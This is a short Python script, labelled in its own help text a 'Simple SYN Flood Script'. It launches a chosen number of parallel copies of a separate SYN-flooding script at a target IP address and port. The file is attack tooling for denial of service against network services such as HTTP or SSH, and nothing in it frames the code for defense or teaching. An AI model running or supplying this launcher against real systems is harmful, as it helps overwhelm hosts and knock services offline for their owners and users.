import shlex
import argparse
import subprocess
from scapy.all import *

parser = argparse.ArgumentParser(description="Simple SYN Flood Script")
parser.add_argument("target_ip", help="Target IP address (e.g router's IP)")
parser.add_argument("-p", "--port", type=int, required=True, help="Destination port (the port of the target's machine service, e.g 80 for HTTP, 22 for SSH and so on).")
parser.add_argument("-n", "--number", type=int,required=True, help="number of subprocesses")
args = parser.parse_args()
target_ip = args.target_ip
target_port = args.port
procs_number = args.number

procs = []
for _ in range(procs_number):
    proc = subprocess.Popen(shlex.split(f"python3 syn_flooding_attack.py {target_ip} --port {target_port}"), stdin=subprocess.PIPE, stdout=subprocess.PIPE, encoding='utf-8')
    procs.append(proc)
for proc in procs:
    proc.communicate()
